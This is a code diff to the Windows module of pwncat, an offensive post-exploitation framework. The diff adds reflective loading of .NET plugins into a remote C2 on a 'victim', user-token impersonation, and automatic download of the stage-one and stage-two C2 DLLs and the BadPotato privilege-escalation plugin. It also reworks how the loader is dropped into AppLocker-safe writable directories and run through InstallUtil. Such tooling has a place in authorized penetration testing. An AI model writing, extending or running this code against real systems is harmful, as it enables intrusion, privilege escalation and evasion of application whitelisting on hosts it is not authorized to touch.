@@ -22,12 +22,14 @@ import time
 import base64
 import shutil
 import signal
+import hashlib
 import pathlib
 import tarfile
 import termios
 import binascii
 import readline
 import textwrap
+import functools
 import subprocess
 from io import (
     BytesIO,
@@ -50,7 +52,7 @@ import pwncat.subprocess
 from pwncat.platform import Path, Platform, PlatformError
 
 INTERACTIVE_END_MARKER = b"INTERACTIVE_COMPLETE\r\n"
-PWNCAT_WINDOWS_C2_VERSION = "v0.2.0"
+PWNCAT_WINDOWS_C2_VERSION = "v0.2.1"
 PWNCAT_WINDOWS_C2_RELEASE_URL = "https://github.com/calebstewart/pwncat-windows-c2/releases/download/{version}/pwncat-windows-{version}.tar.gz"
 
 
@@ -180,7 +182,7 @@ class WindowsFile(RawIOBase):
 
             try:
                 result = self.platform.run_method(
-                    "File", "write", self.handle, base64.b64encode(data)
+                    "File", "write", self.handle, base64.b64encode(data).decode("utf-8")
                 )
             except ProtocolError as exc:
                 # ERROR_BROKEN_PIPE
@@ -192,6 +194,43 @@ class WindowsFile(RawIOBase):
             nwritten += result["count"]
 
         return nwritten
+
+
+class DotNetPlugin(object):
+    """Represents a reflectively loaded .Net plugin within the remote C2
+    This class is a helper which makes calling methods within a plugin
+    more straightforward. If you want to call a method named ``get_system``
+    you can use one of two syntaxes:
+
+    .. code-block:: python
+
+        plugin.run("get_system", "arguments", 1, 2, False)
+        plugin.get_system("arguments", 1, 2, False)
+
+    :param name: basename of the file which was loaded
+    :type name: str
+    :param checksum: md5sum of the assembly
+    :type checksum: str
+    :param ident: identifier for the remote assembly
+    :type ident: int
+    """
+
+    def __init__(self, platform: "Windows", name: str, checksum: str, ident: int):
+
+        self.names = [name]
+        self.checksum = checksum
+        self.ident = ident
+        self.platform = platform
+
+    def __getattr__(self, key: str):
+        """Shortcut for calling a method. ``plugin.method()`` is equivalent
+        to ``plugin.run("method")``."""
+        return functools.partial(self.run, key)
+
+    def run(self, method: str, *args):
+        """ Execute a method within the plugin """
+
+        return self.platform.run_method("Reflection", "call", self.ident, method, args)
 
 
 class PopenWindows(pwncat.subprocess.Popen):
@@ -381,6 +420,20 @@ class PopenWindows(pwncat.subprocess.Popen):
         return (stdout, stderr)
 
 
+@dataclass
+class BuiltinPluginInfo:
+    """ Tells pwncat where to find a builtin plugin """
+
+    name: str
+    """ A friendly name used when loading the plugin """
+    provides: List[str]
+    """ List of DLL names which this plugin provides """
+    url: str
+    """ URL pointing to a tar.gz file containing the plugin DLL(s) """
+    version: str
+    """ The version number to download (this is formatted into the URL) """
+
+
 class Windows(Platform):
     """Concrete platform class abstracting interaction with a Windows/
     Powershell remote host. The remote windows host must support
@@ -389,6 +442,68 @@ class Windows(Platform):
 
     name = "windows"
     PATH_TYPE = pathlib.PureWindowsPath
+    C2_VERSION = "v0.2.1"
+    PLUGIN_INFO = [
+        BuiltinPluginInfo(
+            name="windows-c2",
+            provides=["stageone.dll", "stagetwo.dll"],
+            url="https://github.com/calebstewart/pwncat-windows-c2/releases/download/{version}/pwncat-windows-{version}.tar.gz",
+            version="v0.2.1",
+        ),
+        BuiltinPluginInfo(
+            name="badpotato",
+            provides=["BadPotato.dll"],
+            url="https://github.com/calebstewart/pwncat-badpotato/releases/download/{version}/pwncat-badpotato-{version}.tar.gz",
+            version="v0.0.1-alpha",
+        ),
+    ]
+
+    @classmethod
+    def open_plugin(cls, manager: "pwncat.manager.Manager", name: str) -> BytesIO:
+        """
+        Open the given plugin DLL for reading and return an open file object.
+        If the given name matches a builtin plugin, it will be used. If a
+        builtin plugin is not available, it will be downloaded from it's URL
+        and saved in the provided plugin path. If the name does not match a
+        provided plugin DLL, it is interpreted as a path and attempted to be
+        opened.
+
+        :param manager: the pwncat manager object used to locate the plugin directory
+        :type manager: pwncat.manager.Manager
+        :param name: name of the plugin being requested
+        :type name: str
+        :rtype: BytesIO
+        """
+
+        for plugin in cls.PLUGIN_INFO:
+            if name in plugin.provides:
+                break
+        else:
+            return open(name, "rb")
+
+        path = (
+            pathlib.Path(manager.config["plugin_path"])
+            / plugin.name
+            / plugin.version
+            / name
+        ).expanduser()
+        if not path.exists():
+            path.parent.mkdir(parents=True, exist_ok=True)
+            url = plugin.url.format(version=plugin.version)
+
+            manager.log(f"[blue]windows[/blue]: downloading {plugin.name} plugin")
+            with requests.get(
+                plugin.url.format(version=plugin.version),
+                stream=True,
+            ) as request:
+                data = request.raw.read()
+                with tarfile.open(mode="r:gz", fileobj=BytesIO(data)) as tar:
+                    for provided in plugin.provides:
+                        with tar.extractfile(provided) as provided_filp:
+                            with (path.parent / provided).open("wb") as output:
+                                shutil.copyfileobj(provided_filp, output)
+
+        return path.open("rb")
 
     def __init__(
         self,
@@ -400,6 +515,7 @@ class Windows(Platform):
         super().__init__(session, channel, *args, **kwargs)
 
         self.name = "windows"
+        self.plugins = []
 
         # Initialize interactive tracking
         self._interactive = False
@@ -415,9 +531,6 @@ class Windows(Platform):
         # Tracks paths to modules which have been sideloaded into powershell
         self.psmodules = []
 
-        # Ensure we have the C2 libraries downloaded
-        self._ensure_libs()
-
         self._bootstrap_stage_two()
 
         self.refresh_uid()
@@ -427,7 +540,6 @@ class Windows(Platform):
         # Load requested libraries
         # for library, methods in self.LIBRARY_IMPORTS.items():
         #     self._load_library(library, methods)
-        #
 
     def exit(self):
         """Ensure the C2 exits on the victim end. This is called automatically
@@ -475,6 +587,8 @@ class Windows(Platform):
 
         if wait:
 
+            keyboard_interrupt = False
+
             # Receive the response
             while True:
                 try:
@@ -482,6 +596,14 @@ class Windows(Platform):
                     break
                 except (gzip.BadGzipFile, binascii.Error) as exc:
                     continue
+                except KeyboardInterrupt:
+                    self.session.log(
+                        "[yellow]warning[/yellow]: waiting for command to complete"
+                    )
+                    keyboard_interrupt = True
+
+            if keyboard_interrupt:
+                raise KeyboardInterrupt
 
             # Raise an appropriate error if needed
             if result["error"] != 0:
@@ -500,40 +622,6 @@ function prompt {
   return " "
 }"""
         )
-
-    def _ensure_libs(self):
-        """This method checks that stageone.dll and stagetwo.dll exist within
-        the directory specified by the windows_c2_dir configuration. If they do
-        not, a release copy is downloaded from GitHub. The specific release version
-        is defined by the PWNCAT_WINDOWS_C2_RELEASE_URL variable defined at the top
-        of this file. It should be updated whenever a new C2 version is released."""
-
-        location = pathlib.Path(self.session.config["windows_c2_dir"]).expanduser()
-        location.mkdir(parents=True, exist_ok=True)
-
-        if (
-            not (location / f"stageone-{PWNCAT_WINDOWS_C2_VERSION}.dll").exists()
-            or not (location / f"stagetwo-{PWNCAT_WINDOWS_C2_VERSION}.dll").exists()
-        ):
-            self.session.manager.log(
-                f"Downloading Windows C2 binaries ({PWNCAT_WINDOWS_C2_VERSION}) from GitHub..."
-            )
-            with requests.get(
-                PWNCAT_WINDOWS_C2_RELEASE_URL.format(version=PWNCAT_WINDOWS_C2_VERSION),
-                stream=True,
-            ) as request:
-                data = request.raw.read()
-                with tarfile.open(mode="r:gz", fileobj=BytesIO(data)) as tar:
-                    with tar.extractfile("stageone.dll") as stageone:
-                        with (
-                            location / f"stageone-{PWNCAT_WINDOWS_C2_VERSION}.dll"
-                        ).open("wb") as output:
-                            shutil.copyfileobj(stageone, output)
-                    with tar.extractfile("stagetwo.dll") as stagetwo:
-                        with (
-                            location / f"stagetwo-{PWNCAT_WINDOWS_C2_VERSION}.dll"
-                        ).open("wb") as output:
-                            shutil.copyfileobj(stagetwo, output)
 
     def _bootstrap_stage_two(self):
         """This routine upgrades a standard powershell or cmd shell to an
@@ -564,17 +652,10 @@ function prompt {
         chunk_sz = 1900
 
         loader_encoded_name = pwncat.util.random_string()
-        stageone = (
-            pathlib.Path(self.session.config["windows_c2_dir"]).expanduser()
-            / f"stageone-{PWNCAT_WINDOWS_C2_VERSION}.dll"
-        )
-        stagetwo = (
-            pathlib.Path(self.session.config["windows_c2_dir"]).expanduser()
-            / f"stagetwo-{PWNCAT_WINDOWS_C2_VERSION}.dll"
-        )
 
         # Read the loader
-        with stageone.open("rb") as filp:
+        # with stageone.open("rb") as filp:
+        with Windows.open_plugin(self.manager, "stageone.dll") as filp:
             loader_dll = base64.b64encode(filp.read())
 
         # Extract first chunk
@@ -594,11 +675,11 @@ function prompt {
             self.channel.recvline()
             result = self.channel.recvuntil(b">")
             if b"denied" not in result.lower():
-                self.session.manager.log(f"Good path: {possible}")
+                self.session.log(
+                    f"dropping stage one in {repr(str(loader_remote_path))}"
+                )
                 break
         else:
-            self.session.manager.log(f"Bad path: {possible}")
-            self.session.manager.log(result)
             raise PlatformError("no writable applocker-safe directories")
 
         # Write remaining chunks to selected path
@@ -641,7 +722,11 @@ function prompt {
         # Note whether this is 64-bit or not
         is_64 = "\\Framework64\\" in install_utils
 
-        self.session.manager.log(f"Selected Install Utils: {install_utils}")
+        version = pathlib.PureWindowsPath(install_utils).parts[-2]
+
+        self.session.log(
+            f"using install utils from .net [cyan]{version}[/cyan]", highlight=False
+        )
 
         install_utils = install_utils.replace(" ", "\\ ")
 
@@ -657,7 +742,7 @@ function prompt {
         self.channel.recvuntil(b"\n")
 
         # Load, Compress and Encode stage two
-        with stagetwo.open("rb") as filp:
+        with Windows.open_plugin(self.manager, "stagetwo.dll") as filp:
             stagetwo_dll = filp.read()
             compressed = BytesIO()
             with gzip.GzipFile(fileobj=compressed, mode="wb") as gz:
@@ -1343,3 +1428,90 @@ function prompt {
             raise PowershellError(exc.message)
 
         return [json.loads(x) for x in result["output"]]
+
+    def impersonate(self, token: int):
+        """Impersonate a user token in the powershell and .net contexts.
+
+        :param token: the user token to impersonate
+        :type token: int
+        """
+
+        try:
+            return self.run_method("Identity", "Impersonate", token)
+        except ProtocolError:
+            return False
+
+    def revert_to_self(self):
+        """ Revert any impersonations and return to the original user """
+
+        return self.impersonate(0)
+
+    def dotnet_load(
+        self, name: str, content: Optional[Union[bytes, BytesIO]] = None
+    ) -> DotNetPlugin:
+        """
+        Reflectively load a .Net C2 plugin from the attacker machine. The
+        plugin DLL should implement the ``Plugin`` class and method interface.
+        The name argument can either be a path to a local DLL or the name of a
+        DLL provided by a built-in plugin. Built-in plugins will be automatically
+        downloaded if not present in the directory pointed to by the ``plugin_path``
+        configuration.
+
+        Plugins are also deduplicated prior to loading on the victim. If a given
+        DLL name or a file with a matching hash has already been loaded, the existing
+        plugin object is returned, and the DLL is not loaded again.
+
+        The return :class:`DotNetPlugin` class is capable of cleanly translating method
+        calls to the methods within the loaded DLL. For example, if ``plugin.dll`` defined
+        a method named ``foo``, which took a single string argument, you could call it with:
+
+        .. code-block:: python
+
+            plugin = session.platform.dotnet_load("./plugin.dll")
+            result = plugin.foo("Hello World!")
+
+        Plugins can take as parameters and return any JSON-serializable objects.
+
+        :param name: name or path to the DLL to upload
+        :type name: str
+        :param content: content of the DLL to load or file-like object, if not present on disk
+        :type content: Optional[Union[bytes, BytesIO]]
+        :rtype: DotNetPlugin
+        """
+
+        try:
+            plugin = [plugin for plugin in self.plugins if name in plugin.names][0]
+            return plugin
+        except IndexError:
+            pass
+
+        if content is None:
+            with Windows.open_plugin(self.manager, name) as filp:
+                content = filp.read()
+
+        if not isinstance(content, bytes):
+            content = content.read()
+
+        # Calculate the digest
+        checksum = hashlib.md5(content).hexdigest()
+
+        # Ensure we haven't loaded the same plugin under another name
+        try:
+            plugin = [plugin for plugin in self.plugins if plugin.checksum == checksum][
+                0
+            ]
+            plugin.names.append(name)
+            return plugin
+        except IndexError:
+            pass
+
+        # Encode the assembly
+        assembly = base64.b64encode(content).decode("utf-8")
+
+        # Load the assembly. Let protocol errors propogate
+        ident = self.run_method("Reflection", "load", assembly)
+
+        plugin = DotNetPlugin(self, name, checksum, ident)
+        self.plugins.append(plugin)
+
+        return plugin
